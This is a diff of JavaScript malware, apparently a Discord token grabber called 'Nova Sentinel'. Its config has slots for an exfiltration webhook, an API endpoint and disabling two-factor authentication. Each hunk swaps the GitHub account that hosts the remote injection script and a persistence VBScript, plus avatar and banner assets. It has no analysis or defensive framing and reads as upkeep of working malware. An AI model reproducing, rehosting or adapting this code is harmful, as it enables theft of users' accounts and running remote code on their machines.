@@ -21,8 +21,8 @@ var config = {
   disable2FA: "%DISABLE_2FA%",
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
-  injection_url: "https://raw.githubusercontent.com/LolypoopZ/sub/main/index.js",
-  injector_url: "https://raw.githubusercontent.com/LolypoopZ/sub/main/Persist.vbs",
+  injection_url: "https://raw.githubusercontent.com/KSCHcuck/sub/main/index.js",
+  injector_url: "https://raw.githubusercontent.com/KSCHcuck/sub/main/Persist.vbs",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
@@ -83,7 +83,7 @@ const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
   var params = {
     username: "Nova Sentinel",
     avatar_url:
-      "https://raw.githubusercontent.com/LolypoopZ/sub/main/assets/lilnova.png",
+      "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png",
     content: "",
     embeds: [
       {
@@ -507,10 +507,10 @@ const FirstTime = async () => {
       var Friends = parseFriends(friends);
       if (!user.avatar)
         var userAvatar =
-          "https://raw.githubusercontent.com/LolypoopZ/sub/main/assets/lilnova.png";
+          "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
       if (!user.banner)
         var userBanner =
-          "https://raw.githubusercontent.com/LolypoopZ/sub/main/assets/giphy.gif";
+          "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/giphy.gif";
 
       userBanner =
         userBanner ??
@@ -654,10 +654,10 @@ const FirstTime = async () => {
         var Friends = parseFriends(friends);
         if (!user.avatar)
           var userAvatar =
-            "https://raw.githubusercontent.com/LolypoopZ/sub/main/assets/lilnova.png";
+            "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
         if (!user.banner)
           var userBanner =
-            "https://raw.githubusercontent.com/LolypoopZ/sub/main/assets/giphy.gif";
+            "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/giphy.gif";
 
         userBanner =
           userBanner ??
@@ -838,10 +838,10 @@ async function BoukiTuclcavectesfonctions() {
   );
   if (!user.avatar)
     var userAvatar =
-      "https://raw.githubusercontent.com/LolypoopZ/sub/main/assets/lilnova.png";
+      "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
   if (!user.banner)
     var userBanner =
-      "https://raw.githubusercontent.com/LolypoopZ/sub/main/assets/giphy.gif";
+      "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/giphy.gif";
 
   var userBanner =
     userBanner ??
